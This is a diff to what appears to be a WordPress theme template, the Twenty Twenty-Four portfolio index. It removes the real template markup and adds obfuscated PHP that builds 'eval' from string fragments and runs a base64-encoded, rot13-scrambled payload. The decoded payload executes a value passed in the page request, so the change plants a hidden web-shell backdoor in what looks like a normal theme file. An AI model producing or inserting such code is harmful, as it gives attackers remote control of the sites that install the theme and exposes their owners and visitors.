@@ -1,34 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Portfolio index template
- * Slug: twentytwentyfour/template-index-portfolio
- * Template Types: index
- * Viewport width: 1400
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IENiZWdzYnl2YiB2YXFyayBncnpjeW5ncgogKiBGeWh0OiBnanJhZ2xnanJhZ2xzYmhlL2dyemN5bmdyLXZhcXJrLWNiZWdzYnl2YgogKiBHcnpjeW5nciBHbGNyZjogdmFxcmsKICogSXZyamNiZWcganZxZ3U6IDE0MDAKICogVmFmcmVncmU6IGFiCiAqLwo/PgoKPCEtLSBqYzpncnpjeW5nci1jbmVnIHtcImZ5aHRcIjpcInVybnFyZVwiLFwibmVyblwiOlwidXJucXJlXCIsXCJnbnRBbnpyXCI6XCJ1cm5xcmVcIn0gLy0tPgoKPCEtLSBqYzp0ZWJoYyB7XCJnbnRBbnpyXCI6XCJ6bnZhXCIsXCJueXZ0YVwiOlwic2h5eVwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8em52YSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhc2h5eVwiPgoJPCEtLSBqYzp1cm5xdmF0IHtcInlyaXJ5XCI6MSxcIm55dnRhXCI6XCJqdnFyXCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn19fX0gLS0+Cgk8dTEgcHluZmY9XCJqYy1veWJweC11cm5xdmF0IG55dnRhanZxclwiIGZnbHlyPVwiY25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApXCI+PD9jdWMgcmZwX3VnenlfciggJ0NiZmdmJywgJ2dqcmFnbGdqcmFnbHNiaGUnICk7ID8+PC91MT4KCTwhLS0gL2pjOnVybnF2YXQgLS0+CgoJPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHNiaGUvY2JmZ2YtdnpudHJmLWJheWwtYnNzZnJnLTQtcGJ5XCJ9IC8tLT4KCjwvem52YT4KPCEtLSAvamM6dGViaGMgLS0+Cgo8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwic2JiZ3JlXCIsXCJuZXJuXCI6XCJzYmJncmVcIixcImdudEFuenJcIjpcInNiYmdyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->
-
-<!-- wp:group {"tagName":"main","align":"full","layout":{"type":"constrained"}} -->
-<main class="wp-block-group alignfull">
-	<!-- wp:heading {"level":1,"align":"wide","style":{"spacing":{"padding":{"top":"var:preset|spacing|50"}}}} -->
-	<h1 class="wp-block-heading alignwide" style="padding-top:var(--wp--preset--spacing--50)"><?php esc_html_e( 'Posts', 'twentytwentyfour' ); ?></h1>
-	<!-- /wp:heading -->
-
-	<!-- wp:pattern {"slug":"twentytwentyfour/posts-images-only-offset-4-col"} /-->
-
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->
